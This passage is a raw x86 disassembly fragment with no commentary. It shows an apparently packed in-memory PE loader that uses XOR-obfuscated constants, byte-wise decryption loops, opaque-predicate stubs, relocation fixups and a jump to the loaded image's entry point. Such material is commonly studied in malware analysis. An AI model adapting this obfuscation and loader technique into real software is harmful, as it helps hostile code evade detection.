  425d11:	add    ecx,esi
  425d13:	push   ecx
  425d14:	mov    ecx,DWORD PTR [ebp-0xc]
  425d17:	xor    ecx,ebx
  425d19:	add    ecx,esi
  425d1b:	push   ecx
  425d1c:	push   DWORD PTR [ebp-0x28]
  425d1f:	call   DWORD PTR [eax+0x18]
  425d22:	mov    eax,DWORD PTR [ebp-0x20]
  425d25:	mov    DWORD PTR [ebp-0x28],eax
  425d28:	mov    eax,DWORD PTR [ebp-0x10]
  425d2b:	mov    DWORD PTR [ebp-0x40],eax
  425d2e:	jmp    0x425d43
  425d30:	xor    ecx,ebx
  425d32:	add    ecx,esi
  425d34:	push   ecx
  425d35:	mov    ecx,DWORD PTR [ebp-0xc]
  425d38:	xor    ecx,ebx
  425d3a:	add    ecx,esi
  425d3c:	push   ecx
  425d3d:	push   DWORD PTR [ebp-0x20]
  425d40:	call   DWORD PTR [eax+0x18]
  425d43:	mov    eax,DWORD PTR [ebp-0x40]
  425d46:	mov    DWORD PTR [ebp-0x38],eax
  425d49:	mov    eax,DWORD PTR [ebp-0x28]
  425d4c:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  425d53:	mov    DWORD PTR [ebp-0x3c],eax
  425d56:	mov    edi,0xf89c85b8
  425d5b:	mov    DWORD PTR [ebp-0x30],edi
  425d5e:	mov    eax,DWORD PTR [ebp-0x24]
  425d61:	xor    eax,ebx
  425d63:	add    eax,esi
  425d65:	mov    DWORD PTR [ebp-0xc],eax
  425d68:	mov    eax,DWORD PTR [ebp-0x24]
  425d6b:	xor    eax,ebx
  425d6d:	add    eax,esi
  425d6f:	mov    DWORD PTR [ebp-0x10],eax
  425d72:	mov    DWORD PTR [ebp-0x48],0xf89c85d9
  425d79:	mov    DWORD PTR [ebp-0x20],0xf89c85be
  425d80:	mov    eax,DWORD PTR [ebp-0x24]
  425d83:	mov    ecx,DWORD PTR [ebp-0x38]
  425d86:	xor    eax,ebx
  425d88:	add    eax,esi
  425d8a:	cmp    ecx,eax
  425d8c:	je     0x425f82
  425d92:	jmp    0x425f5e
  425d97:	mov    ecx,DWORD PTR [ebp-0xc]
  425d9a:	mov    eax,DWORD PTR [ebp-0x38]
  425d9d:	sub    eax,ecx
  425d9f:	mov    ecx,DWORD PTR [ebp-0x48]
  425da2:	xor    ecx,ebx
  425da4:	add    ecx,esi
  425da6:	xor    edx,edx
  425da8:	div    ecx
  425daa:	mov    DWORD PTR [ebp-0x10],eax
  425dad:	mov    eax,DWORD PTR [ebp-0x20]
  425db0:	mov    ecx,DWORD PTR [ebp-0x10]
  425db3:	xor    eax,ebx
  425db5:	add    eax,esi
  425db7:	cmp    ecx,eax
  425db9:	jbe    0x425dc5
  425dbb:	mov    eax,DWORD PTR [ebp-0x20]
  425dbe:	xor    eax,ebx
  425dc0:	add    eax,esi
  425dc2:	mov    DWORD PTR [ebp-0x10],eax
  425dc5:	mov    eax,DWORD PTR [ebp-0x48]
  425dc8:	mov    ecx,DWORD PTR [ebp-0x10]
  425dcb:	xor    eax,ebx
  425dcd:	add    eax,esi
  425dcf:	imul   eax,ecx
  425dd2:	mov    DWORD PTR [ebp-0x10],eax
  425dd5:	mov    eax,DWORD PTR [ebp-0x24]
  425dd8:	mov    ecx,DWORD PTR [ebp-0x10]
  425ddb:	xor    eax,ebx
  425ddd:	add    eax,esi
  425ddf:	cmp    ecx,eax
  425de1:	je     0x425f4c
  425de7:	mov    eax,DWORD PTR [ebp-0x10]
  425dea:	mov    DWORD PTR [ebp-0x34],eax
  425ded:	mov    eax,DWORD PTR [ebp-0xc]
  425df0:	add    eax,DWORD PTR [ebp-0x3c]
  425df3:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  425dfa:	mov    DWORD PTR [ebp-0x10],edi
  425dfd:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  425e04:	mov    DWORD PTR [ebp-0x1c],eax
  425e07:	mov    DWORD PTR [ebp-0x2c],0xf89c85ba
  425e0e:	mov    DWORD PTR [ebp-0x8],edi
  425e11:	mov    eax,DWORD PTR [ebp-0x54]
  425e14:	xor    eax,ebx
  425e16:	add    eax,esi
  425e18:	jmp    0x425f0b
  425e1d:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  425e27:	mov    DWORD PTR [ebp-0x9c],0xf89c85ad
  425e31:	mov    eax,DWORD PTR [ebp-0x8]
  425e34:	mov    ecx,DWORD PTR [ebp-0x18]
  425e37:	xor    eax,ebx
  425e39:	add    eax,esi
  425e3b:	imul   eax,ecx
  425e3e:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e41:	mov    al,BYTE PTR [eax+ecx*1]
  425e44:	mov    BYTE PTR [ebp-0x1],al
  425e47:	mov    eax,DWORD PTR [ebp-0x8]
  425e4a:	mov    ecx,DWORD PTR [ebp-0x18]
  425e4d:	xor    eax,ebx
  425e4f:	add    eax,esi
  425e51:	imul   eax,ecx
  425e54:	mov    ecx,DWORD PTR [ebp-0x4c]
  425e57:	xor    ecx,ebx
  425e59:	add    eax,ecx
  425e5b:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e5e:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  425e66:	mov    ecx,DWORD PTR [ebp-0xac]
  425e6c:	xor    ecx,ebx
  425e6e:	lea    eax,[ecx+eax*1+0x3272e0]
  425e75:	movzx  ecx,BYTE PTR [ebp-0x1]
  425e79:	xor    ecx,eax
  425e7b:	mov    BYTE PTR [ebp-0x1],cl
  425e7e:	mov    al,BYTE PTR [ebp-0x1]
  425e81:	mov    ecx,DWORD PTR [ebp-0x8]
  425e84:	mov    edx,DWORD PTR [ebp-0x18]
  425e87:	xor    ecx,ebx
  425e89:	add    ecx,esi
  425e8b:	imul   ecx,edx
  425e8e:	mov    edx,DWORD PTR [ebp-0x1c]
  425e91:	mov    BYTE PTR [ecx+edx*1],al
  425e94:	mov    eax,DWORD PTR [ebp-0x8]
  425e97:	mov    ecx,DWORD PTR [ebp-0x18]
  425e9a:	xor    eax,ebx
  425e9c:	add    eax,esi
  425e9e:	imul   eax,ecx
  425ea1:	mov    ecx,DWORD PTR [ebp-0x1c]
  425ea4:	mov    al,BYTE PTR [eax+ecx*1]
  425ea7:	mov    BYTE PTR [ebp-0x1],al
  425eaa:	mov    eax,DWORD PTR [ebp-0x8]
  425ead:	mov    ecx,DWORD PTR [ebp-0x18]
  425eb0:	xor    eax,ebx
  425eb2:	add    eax,esi
  425eb4:	imul   eax,ecx
  425eb7:	mov    ecx,DWORD PTR [ebp-0x10]
  425eba:	xor    ecx,ebx
  425ebc:	add    eax,ecx
  425ebe:	mov    ecx,DWORD PTR [ebp-0x1c]
  425ec1:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e0]
  425ec9:	mov    ecx,DWORD PTR [ebp-0x9c]
  425ecf:	xor    ecx,ebx
  425ed1:	lea    eax,[ecx+eax*1+0x3272e0]
  425ed8:	movzx  ecx,BYTE PTR [ebp-0x1]
  425edc:	xor    ecx,eax
  425ede:	mov    BYTE PTR [ebp-0x1],cl
  425ee1:	mov    al,BYTE PTR [ebp-0x1]
  425ee4:	mov    ecx,DWORD PTR [ebp-0x8]
  425ee7:	mov    edx,DWORD PTR [ebp-0x18]
  425eea:	xor    ecx,ebx
  425eec:	add    ecx,esi
  425eee:	imul   ecx,edx
  425ef1:	mov    edx,DWORD PTR [ebp-0x1c]
  425ef4:	mov    BYTE PTR [ecx+edx*1],al
  425ef7:	mov    eax,DWORD PTR [ebp-0x2c]
  425efa:	mov    ecx,DWORD PTR [ebp-0x10]
  425efd:	xor    eax,ebx
  425eff:	xor    ecx,ebx
  425f01:	add    eax,esi
  425f03:	add    ecx,esi
  425f05:	imul   eax,ecx
  425f08:	add    eax,DWORD PTR [ebp-0x18]
  425f0b:	mov    DWORD PTR [ebp-0x18],eax
  425f0e:	mov    eax,DWORD PTR [ebp-0x18]
  425f11:	mov    ecx,DWORD PTR [ebp-0x34]
  425f14:	cmp    ecx,eax
  425f16:	jb     0x425e1d
  425f1c:	mov    eax,DWORD PTR [ebp-0x10]
  425f1f:	mov    ecx,DWORD PTR [ebp-0x34]
  425f22:	xor    eax,ebx
  425f24:	add    eax,esi
  425f26:	imul   eax,ecx
  425f29:	mov    ecx,DWORD PTR [ebp-0x54]
  425f2c:	xor    ecx,ebx
  425f2e:	add    ecx,esi
  425f30:	or     eax,ecx
  425f32:	mov    ecx,DWORD PTR [ebp-0x30]
  425f35:	xor    ecx,ebx
  425f37:	add    eax,ecx
  425f39:	mov    ecx,DWORD PTR [ebp-0x30]
  425f3c:	xor    ecx,ebx
  425f3e:	add    eax,ecx
  425f40:	mov    ecx,DWORD PTR [ebp-0xc]
  425f43:	lea    eax,[eax+ecx*1+0x64e5c0]
  425f4a:	jmp    0x425f5b
  425f4c:	mov    eax,DWORD PTR [ebp-0x30]
  425f4f:	mov    ecx,DWORD PTR [ebp-0xc]
  425f52:	xor    eax,ebx
  425f54:	lea    eax,[eax+ecx*1+0x3272e0]
  425f5b:	mov    DWORD PTR [ebp-0xc],eax
  425f5e:	mov    eax,DWORD PTR [ebp-0x30]
  425f61:	xor    eax,ebx
  425f63:	mov    ecx,0xffcd8d20
  425f68:	sub    ecx,eax
  425f6a:	add    ecx,DWORD PTR [ebp-0x38]
  425f6d:	mov    eax,DWORD PTR [ebp-0x30]
  425f70:	mov    edx,DWORD PTR [ebp-0xc]
  425f73:	xor    eax,ebx
  425f75:	add    eax,esi
  425f77:	imul   eax,edx
  425f7a:	cmp    eax,ecx
  425f7c:	jbe    0x425d97
  425f82:	push   DWORD PTR [ebp+0x8]
  425f85:	mov    eax,DWORD PTR [ebp+0x8]
  425f88:	push   DWORD PTR [eax+0x1cc]
  425f8e:	lea    eax,[ebp-0xa0]
  425f94:	push   eax
  425f95:	mov    eax,DWORD PTR [ebp+0x8]
  425f98:	mov    eax,DWORD PTR [eax+0x1c4]
  425f9e:	push   DWORD PTR [eax]
  425fa0:	mov    eax,DWORD PTR [ebp+0x8]
  425fa3:	mov    eax,DWORD PTR [eax+0x1c0]
  425fa9:	push   DWORD PTR [eax]
  425fab:	push   DWORD PTR [ebp-0x40]
  425fae:	push   DWORD PTR [ebp-0x28]
  425fb1:	call   0x426a87
  425fb6:	mov    DWORD PTR [ebp-0x3c],eax
  425fb9:	mov    eax,DWORD PTR [ebp-0x14]
  425fbc:	mov    ecx,DWORD PTR [ebp-0x28]
  425fbf:	xor    eax,ebx
  425fc1:	add    eax,esi
  425fc3:	cmp    eax,ecx
  425fc5:	je     0x425fe6
  425fc7:	mov    eax,DWORD PTR [ebp+0x8]
  425fca:	mov    ecx,DWORD PTR [ebp-0x50]
  425fcd:	mov    eax,DWORD PTR [eax+0x1d8]
  425fd3:	xor    ecx,ebx
  425fd5:	add    ecx,esi
  425fd7:	push   ecx
  425fd8:	mov    ecx,DWORD PTR [ebp-0x14]
  425fdb:	xor    ecx,ebx
  425fdd:	add    ecx,esi
  425fdf:	push   ecx
  425fe0:	push   DWORD PTR [ebp-0x28]
  425fe3:	call   DWORD PTR [eax+0x18]
  425fe6:	pop    edi
  425fe7:	pop    esi
  425fe8:	pop    ebx
  425fe9:	leave  
  425fea:	ret    0x4
  425fed:	push   ebp
  425fee:	mov    ebp,esp
  425ff0:	push   ecx
  425ff1:	push   ecx
  425ff2:	lea    eax,[ebp-0x8]
  425ff5:	mov    DWORD PTR [ebp-0x4],eax
  425ff8:	push   esi
  425ff9:	mov    esi,DWORD PTR [ebp-0x4]
  425ffc:	mov    eax,0xf881ba0f
  426001:	mov    DWORD PTR [esi],eax
  426003:	mov    esi,DWORD PTR [ebp-0x8]
  426006:	cmp    esi,eax
  426008:	pop    esi
  426009:	jne    0x426013
  42600b:	mov    BYTE PTR [ecx+0xa],0x7a
  42600f:	mov    BYTE PTR [edx+0x8],0x2f
  426013:	mov    BYTE PTR [edx+0xa],0x7a
  426017:	mov    BYTE PTR [ecx+0x2],0x4
  42601b:	leave  
  42601c:	ret    
  42601d:	push   ebp
  42601e:	mov    ebp,esp
  426020:	push   ecx
  426021:	push   ecx
  426022:	lea    eax,[ebp-0x8]
  426025:	mov    DWORD PTR [ebp-0x4],eax
  426028:	mov    edx,DWORD PTR [ebp-0x4]
  42602b:	mov    eax,0xf88b0be3
  426030:	mov    DWORD PTR [edx],eax
  426032:	mov    edx,DWORD PTR [ebp-0x8]
  426035:	cmp    edx,eax
  426037:	jne    0x426048
  426039:	mov    eax,DWORD PTR [ebp+0x8]
  42603c:	mov    BYTE PTR [ecx+0x9],0xe
  426040:	mov    BYTE PTR [eax+0x7],0x47
  426044:	mov    BYTE PTR [ecx+0x6],0xf
  426048:	mov    BYTE PTR [ecx+0x3],0x1e
  42604c:	leave  
  42604d:	ret    0x4
  426050:	push   ebp
  426051:	mov    ebp,esp
  426053:	push   ecx
  426054:	push   ecx
  426055:	lea    eax,[ebp-0x8]
  426058:	mov    DWORD PTR [ebp-0x4],eax
  42605b:	mov    edx,DWORD PTR [ebp-0x4]
  42605e:	mov    eax,0x7e0da0f
  426063:	mov    DWORD PTR [edx],eax
  426065:	mov    edx,DWORD PTR [ebp-0x8]
  426068:	cmp    edx,eax
  42606a:	jne    0x426070
  42606c:	mov    BYTE PTR [ecx+0x7],0x47
  426070:	mov    eax,DWORD PTR [ebp+0x8]
  426073:	mov    BYTE PTR [ecx+0x1],0x1
  426077:	mov    BYTE PTR [eax+0x9],0x2e
  42607b:	leave  
  42607c:	ret    0x4
  42607f:	push   ebp
  426080:	mov    ebp,esp
  426082:	push   ecx
  426083:	push   ecx
  426084:	lea    eax,[ebp-0x8]
  426087:	mov    DWORD PTR [ebp-0x4],eax
  42608a:	push   esi
  42608b:	mov    esi,DWORD PTR [ebp-0x4]
  42608e:	mov    eax,0x7060e3e
  426093:	mov    DWORD PTR [esi],eax
  426095:	mov    esi,DWORD PTR [ebp-0x8]
  426098:	cmp    esi,eax
  42609a:	pop    esi
  42609b:	jne    0x4260a7
  42609d:	mov    BYTE PTR [edx+0x4],0xb
  4260a1:	mov    WORD PTR [ecx+0x3],0xb1e
  4260a7:	mov    BYTE PTR [edx],0x3f
  4260aa:	leave  
  4260ab:	ret    
  4260ac:	push   ebp
  4260ad:	mov    ebp,esp
  4260af:	push   ecx
  4260b0:	push   ecx
  4260b1:	lea    eax,[ebp-0x8]
  4260b4:	mov    DWORD PTR [ebp-0x4],eax
  4260b7:	mov    edx,DWORD PTR [ebp-0x4]
  4260ba:	mov    eax,0xf8870b3f
  4260bf:	mov    DWORD PTR [edx],eax
  4260c1:	mov    edx,DWORD PTR [ebp-0x8]
  4260c4:	cmp    edx,eax
  4260c6:	jne    0x4260d3
  4260c8:	mov    eax,DWORD PTR [ebp+0x8]
  4260cb:	mov    BYTE PTR [ecx+0x8],0xf
  4260cf:	mov    BYTE PTR [eax+0x1],0x1
  4260d3:	mov    BYTE PTR [ecx+0x5],0xf3
  4260d7:	leave  
  4260d8:	ret    0x4
  4260db:	push   esi
  4260dc:	mov    ecx,edi
  4260de:	call   0x4260ac
  4260e3:	mov    edx,edi
  4260e5:	mov    ecx,esi
  4260e7:	mov    BYTE PTR [esi],0x1f
  4260ea:	call   0x42607f
  4260ef:	push   esi
  4260f0:	mov    ecx,edi
  4260f2:	mov    BYTE PTR [esi+0x5],0xf3
  4260f6:	call   0x426050
  4260fb:	push   esi
  4260fc:	mov    BYTE PTR [esi+0x6],0xf
  426100:	call   0x42601d
  426105:	mov    BYTE PTR [esi+0x2],0x4
  426109:	mov    edx,esi
  42610b:	jmp    0x425fed
  426110:	push   ebp
  426111:	mov    ebp,esp
  426113:	push   ecx
  426114:	mov    ecx,DWORD PTR [edx+0x194]
  42611a:	push   esi
  42611b:	mov    esi,DWORD PTR [ebp+0x8]
  42611e:	mov    esi,DWORD PTR [esi]
  426120:	mov    DWORD PTR [ecx],esi
  426122:	mov    ecx,DWORD PTR [edx+0x194]
  426128:	mov    ecx,DWORD PTR [ecx]
  42612a:	mov    esi,DWORD PTR [edx+0x190]
  426130:	mov    DWORD PTR [esi],ecx
  426132:	mov    eax,DWORD PTR [edx+0x194]
  426138:	mov    ecx,DWORD PTR [eax]
  42613a:	mov    ecx,DWORD PTR [ecx+0x3c]
  42613d:	add    ecx,DWORD PTR [eax]
  42613f:	mov    DWORD PTR [ebp-0x4],0xf89ca5b9
  426146:	mov    eax,DWORD PTR [ebp-0x4]
  426149:	movzx  ecx,WORD PTR [ecx+0x16]
  42614d:	xor    eax,0x7510899
  426152:	add    eax,0x3272e0
  426157:	pop    esi
  426158:	test   ecx,eax
  42615a:	je     0x426168
  42615c:	mov    eax,DWORD PTR [edx+0x1c8]
  426162:	mov    DWORD PTR [eax],0xf89c85b8
  426168:	leave  
  426169:	ret    0x4
  42616c:	push   ebp
  42616d:	mov    ebp,esp
  42616f:	sub    esp,0x70
  426172:	and    DWORD PTR [ebp-0x20],0x0
  426176:	mov    DWORD PTR [ebp-0x18],0xf89cb5b9
  42617d:	mov    DWORD PTR [ebp-0x1c],0xf89c85f9
  426184:	mov    DWORD PTR [ebp-0x2c],0xf89c85bd
  42618b:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  426192:	mov    DWORD PTR [ebp-0x2c],0xf89f05b9
  426199:	mov    eax,DWORD PTR [ebp+0x20]
  42619c:	mov    eax,DWORD PTR [eax+0x194]
  4261a2:	mov    DWORD PTR [ebp-0xc],eax
  4261a5:	mov    eax,DWORD PTR [ebp+0x20]
  4261a8:	push   ebx
  4261a9:	push   esi
  4261aa:	mov    esi,DWORD PTR [eax+0x190]
  4261b0:	mov    eax,DWORD PTR [ebp+0x20]
  4261b3:	mov    eax,DWORD PTR [eax+0x18c]
  4261b9:	mov    DWORD PTR [ebp-0x8],eax
  4261bc:	mov    eax,DWORD PTR [eax]
  4261be:	push   edi
  4261bf:	mov    DWORD PTR [ebp-0x4],esi
  4261c2:	test   eax,eax
  4261c4:	jne    0x4261d1
  4261c6:	push   DWORD PTR [ebp+0x1c]
  4261c9:	mov    edx,DWORD PTR [ebp+0x20]
  4261cc:	call   0x426110
  4261d1:	mov    eax,DWORD PTR [esi]
  4261d3:	mov    ebx,DWORD PTR [esi]
  4261d5:	add    ebx,DWORD PTR [eax+0x3c]
  4261d8:	mov    eax,DWORD PTR [ebp+0xc]
  4261db:	mov    ecx,DWORD PTR [ebp-0x8]
  4261de:	mov    ecx,DWORD PTR [ecx]
  4261e0:	mov    esi,0x7510899
  4261e5:	xor    eax,esi
  4261e7:	mov    edi,0x3272e0
  4261ec:	add    eax,edi
  4261ee:	cmp    eax,ecx
  4261f0:	jne    0x426428
  4261f6:	mov    eax,DWORD PTR [ebp-0xc]
  4261f9:	mov    eax,DWORD PTR [eax]
  4261fb:	mov    DWORD PTR [ebp-0x10],eax
  4261fe:	mov    eax,DWORD PTR [ebx+0x50]
  426201:	mov    DWORD PTR [ebp-0x68],eax
  426204:	mov    eax,DWORD PTR [ebp-0x18]
  426207:	xor    eax,esi
  426209:	add    eax,edi
  42620b:	mov    DWORD PTR [ebp-0x64],eax
  42620e:	mov    eax,DWORD PTR [ebp-0x14]
  426211:	and    DWORD PTR [ebp-0x6c],0x0
  426215:	xor    eax,esi
  426217:	add    eax,edi
  426219:	mov    DWORD PTR [ebp-0x60],eax
  42621c:	lea    eax,[ebp-0x70]
  42621f:	push   eax
  426220:	mov    eax,DWORD PTR [ebp+0x8]
  426223:	xor    eax,esi
  426225:	add    eax,edi
  426227:	push   eax
  426228:	mov    eax,DWORD PTR [ebp+0x20]
  42622b:	add    eax,0xaa
  426230:	push   eax
  426231:	mov    eax,DWORD PTR [ebp+0x20]
  426234:	mov    eax,DWORD PTR [eax+0x198]
  42623a:	mov    DWORD PTR [ebp-0x70],0x4
  426241:	push   DWORD PTR [eax]
  426243:	mov    eax,DWORD PTR [ebp+0x10]
  426246:	call   eax
  426248:	mov    ecx,DWORD PTR [ebp-0xc]
  42624b:	mov    ecx,DWORD PTR [ecx]
  42624d:	mov    edx,DWORD PTR [ebp-0x8]
  426250:	mov    DWORD PTR [ebp-0x6c],eax
  426253:	mov    DWORD PTR [ebp+0x1c],eax
  426256:	mov    DWORD PTR [edx],ecx
  426258:	mov    ecx,DWORD PTR [ebp-0x4]
  42625b:	mov    DWORD PTR [ecx],eax
  42625d:	mov    eax,DWORD PTR [ebx+0x50]
  426260:	mov    DWORD PTR [ebp-0x68],eax
  426263:	mov    eax,DWORD PTR [ebp-0x1c]
  426266:	xor    eax,esi
  426268:	add    eax,edi
  42626a:	mov    DWORD PTR [ebp-0x64],eax
  42626d:	lea    eax,[ebp-0x20]
  426270:	mov    DWORD PTR [ebp-0x60],eax
  426273:	lea    eax,[ebp-0x70]
  426276:	push   eax
  426277:	mov    eax,DWORD PTR [ebp+0x8]
  42627a:	xor    eax,esi
  42627c:	add    eax,edi
  42627e:	push   eax
  42627f:	mov    eax,DWORD PTR [ebp+0x20]
  426282:	add    eax,0xee
  426287:	push   eax
  426288:	mov    eax,DWORD PTR [ebp+0x20]
  42628b:	mov    eax,DWORD PTR [eax+0x198]
  426291:	mov    DWORD PTR [ebp-0x70],0x4
  426298:	push   DWORD PTR [eax]
  42629a:	mov    eax,DWORD PTR [ebp+0x10]
  42629d:	call   eax
  42629f:	test   eax,eax
  4262a1:	je     0x4262c6
  4262a3:	and    DWORD PTR [ebp+0xc],0x0
  4262a7:	cmp    DWORD PTR [ebx+0x50],0x0
  4262ab:	jbe    0x4262c6
  4262ad:	mov    eax,DWORD PTR [ebp+0x1c]
  4262b0:	mov    ecx,DWORD PTR [ebp-0x10]
  4262b3:	sub    ecx,eax
  4262b5:	mov    dl,BYTE PTR [ecx+eax*1]
  4262b8:	inc    DWORD PTR [ebp+0xc]
  4262bb:	mov    BYTE PTR [eax],dl
  4262bd:	mov    edx,DWORD PTR [ebp+0xc]
  4262c0:	inc    eax
  4262c1:	cmp    edx,DWORD PTR [ebx+0x50]
  4262c4:	jb     0x4262b5
  4262c6:	mov    edx,DWORD PTR [ebp+0x1c]
  4262c9:	mov    ecx,DWORD PTR [edx+0x3c]
  4262cc:	add    ecx,edx
  4262ce:	mov    eax,DWORD PTR [ecx+0xa0]
  4262d4:	mov    ebx,DWORD PTR [ecx+0x28]
  4262d7:	add    eax,edx
  4262d9:	sub    edx,DWORD PTR [ebp-0x10]
  4262dc:	add    ebx,DWORD PTR [ebp+0x1c]
  4262df:	mov    DWORD PTR [ebp+0xc],edx
  4262e2:	mov    DWORD PTR [ebp-0x2c],ecx
  4262e5:	mov    DWORD PTR [ebp-0x14],ebx
  4262e8:	mov    DWORD PTR [ebp-0x8],0x0
  4262ef:	jmp    0x42636b
  4262f1:	add    edx,0xfffffff8
  4262f4:	shr    edx,1
  4262f6:	mov    DWORD PTR [ebp-0x18],edx
  4262f9:	je     0x426357
  4262fb:	lea    edx,[eax+0x8]
  4262fe:	mov    DWORD PTR [ebp-0x4],edx
  426301:	mov    edx,DWORD PTR [ebp-0x18]
  426304:	mov    DWORD PTR [ebp-0x18],edx
  426307:	mov    edx,DWORD PTR [ebp-0x4]
  42630a:	movzx  edx,WORD PTR [edx]
  42630d:	mov    DWORD PTR [ebp-0x24],edx
  426310:	and    edx,0xfff
  426316:	mov    DWORD PTR [ebp-0x28],edx
  426319:	mov    edx,DWORD PTR [ebp-0x24]
  42631c:	shr    edx,0xc
  42631f:	add    edx,0xffcd8d20
  426325:	xor    edx,esi
  426327:	cmp    edx,0xf89c85ba
  42632d:	jne    0x42634e
  42632f:	mov    edx,DWORD PTR [ebp-0x28]
  426332:	add    edx,DWORD PTR [ebp+0x1c]
  426335:	mov    ebx,DWORD PTR [eax]
  426337:	cmp    DWORD PTR [ebx+edx*1],0x0
  42633b:	je     0x42634b
  42633d:	mov    ecx,DWORD PTR [ebp+0xc]
  426340:	add    ecx,DWORD PTR [ebx+edx*1]
  426343:	mov    ebx,DWORD PTR [eax]
  426345:	mov    DWORD PTR [edx+ebx*1],ecx
  426348:	mov    ecx,DWORD PTR [ebp-0x2c]
  42634b:	mov    ebx,DWORD PTR [ebp-0x14]
  42634e:	add    DWORD PTR [ebp-0x4],0x2
  426352:	dec    DWORD PTR [ebp-0x18]
  426355:	jne    0x426307
  426357:	mov    edx,DWORD PTR [ebp-0xc]
  42635a:	add    DWORD PTR [ebp-0x8],edx
  42635d:	mov    edx,DWORD PTR [ebp-0x8]
  426360:	cmp    edx,DWORD PTR [ecx+0xa4]
  426366:	jae    0x426379
  426368:	add    eax,DWORD PTR [ebp-0xc]
  42636b:	mov    edx,DWORD PTR [eax+0x4]
  42636e:	mov    DWORD PTR [ebp-0xc],edx
  426371:	test   edx,edx
  426373:	jne    0x4262f1
  426379:	mov    eax,DWORD PTR [ebp-0x10]
  42637c:	mov    DWORD PTR [ebp-0x6c],eax
  42637f:	mov    DWORD PTR [ebp-0x70],0x4
  426386:	mov    eax,DWORD PTR [ecx+0x50]
  426389:	mov    DWORD PTR [ebp-0x68],eax
  42638c:	mov    eax,DWORD PTR [ebp-0x1c]
  42638f:	xor    eax,esi
  426391:	add    eax,edi
  426393:	mov    DWORD PTR [ebp-0x64],eax
  426396:	lea    eax,[ebp-0x20]
  426399:	mov    DWORD PTR [ebp-0x60],eax
  42639c:	lea    eax,[ebp-0x70]
  42639f:	push   eax
  4263a0:	mov    eax,DWORD PTR [ebp+0x8]
  4263a3:	xor    eax,esi
  4263a5:	add    eax,edi
  4263a7:	push   eax
  4263a8:	mov    eax,DWORD PTR [ebp+0x20]
  4263ab:	add    eax,0xee
  4263b0:	push   eax
  4263b1:	mov    eax,DWORD PTR [ebp+0x20]
  4263b4:	mov    eax,DWORD PTR [eax+0x198]
  4263ba:	push   DWORD PTR [eax]
  4263bc:	mov    eax,DWORD PTR [ebp+0x10]
  4263bf:	call   eax
  4263c1:	mov    eax,DWORD PTR [ebp+0x20]
  4263c4:	mov    eax,DWORD PTR [eax+0x180]
  4263ca:	add    eax,DWORD PTR [ebp+0xc]
  4263cd:	mov    ecx,DWORD PTR [ebp+0xc]
  4263d0:	push   DWORD PTR [ebp+0x18]
  4263d3:	mov    DWORD PTR [eax],ecx
  4263d5:	push   DWORD PTR [ebp+0x14]
  4263d8:	push   DWORD PTR [ebp+0x1c]
  4263db:	call   ebx
  4263dd:	mov    eax,DWORD PTR [ebp+0xc]
  4263e0:	add    eax,DWORD PTR [ebp+0x20]
  4263e3:	lea    ecx,[ebp+0x4]
  4263e6:	mov    DWORD PTR [ebp+0x20],eax
  4263e9:	mov    eax,DWORD PTR [ebp+0x20]
  4263ec:	mov    eax,DWORD PTR [ebp+0x20]
  4263ef:	mov    edx,DWORD PTR [eax+0x190]
  4263f5:	mov    eax,DWORD PTR [ebp+0x20]
  4263f8:	mov    eax,DWORD PTR [eax+0x18c]
  4263fe:	mov    esi,DWORD PTR [eax]
  426400:	cmp    DWORD PTR [ecx],esi
  426402:	jb     0x426423
  426404:	mov    esi,DWORD PTR [edx]
  426406:	mov    edi,DWORD PTR [edx]
  426408:	mov    esi,DWORD PTR [esi+0x3c]
  42640b:	lea    esi,[edi+esi*1+0x50]
  42640f:	mov    edi,DWORD PTR [eax]
  426411:	add    edi,DWORD PTR [esi]
  426413:	cmp    DWORD PTR [ecx],edi
  426415:	jae    0x426423
  426417:	mov    esi,DWORD PTR [eax]
  426419:	mov    eax,DWORD PTR [ecx]
  42641b:	mov    edx,DWORD PTR [edx]
  42641d:	sub    eax,esi
  42641f:	add    edx,eax
  426421:	mov    DWORD PTR [ecx],edx
  426423:	mov    eax,DWORD PTR [ebp+0xc]
  426426:	jmp    0x426469
  426428:	push   DWORD PTR [ebp+0x20]
  42642b:	call   0x425402
  426430:	mov    eax,DWORD PTR [ebp+0x20]
  426433:	mov    eax,DWORD PTR [eax+0x1c8]
  426439:	mov    eax,DWORD PTR [eax]
  42643b:	xor    eax,esi
  42643d:	add    eax,edi
  42643f:	mov    eax,DWORD PTR [ebp+0x20]
  426442:	jne    0x42645a
  426444:	mov    ecx,DWORD PTR [ebp+0x20]
  426447:	mov    ecx,DWORD PTR [ecx+0x1cc]
  42644d:	push   DWORD PTR [ecx]
  42644f:	mov    eax,DWORD PTR [eax+0x1d8]
  426455:	call   DWORD PTR [eax+0x28]
  426458:	jmp    0x426467
  42645a:	mov    eax,DWORD PTR [eax+0x17c]
  426460:	mov    ecx,DWORD PTR [eax]
  426462:	lea    eax,[ebp+0x4]
  426465:	add    DWORD PTR [eax],ecx
  426467:	xor    eax,eax
  426469:	pop    edi
  42646a:	pop    esi
  42646b:	pop    ebx
  42646c:	leave  
  42646d:	ret    0x1c
  426470:	push   ebp
  426471:	mov    ebp,esp
  426473:	sub    esp,0x1c
  426476:	push   esi
  426477:	mov    esi,eax
  426479:	mov    eax,DWORD PTR [ecx+0x190]
  42647f:	cmp    DWORD PTR [eax],0x0
  426482:	je     0x426592
  426488:	test   edx,edx
  42648a:	je     0x426592
  426490:	test   esi,esi
  426492:	je     0x426592
  426498:	mov    eax,DWORD PTR [esi+0x88]
  42649e:	test   eax,eax
  4264a0:	je     0x42658d
  4264a6:	cmp    DWORD PTR [esi+0x8c],0x10
  4264ad:	je     0x42658d
  4264b3:	cmp    DWORD PTR [esi+0x34],edx
  4264b6:	je     0x42658d
  4264bc:	mov    esi,DWORD PTR [ecx+0x18c]
  4264c2:	and    DWORD PTR [ebp-0x10],0x0
  4264c6:	mov    ecx,edx
  4264c8:	sub    ecx,DWORD PTR [esi]
  4264ca:	add    eax,edx
  4264cc:	movzx  edx,WORD PTR [eax+0xc]
  4264d0:	mov    DWORD PTR [ebp-0x1c],ecx
  4264d3:	movzx  ecx,WORD PTR [eax+0xe]
  4264d7:	add    ecx,edx
  4264d9:	je     0x42658d
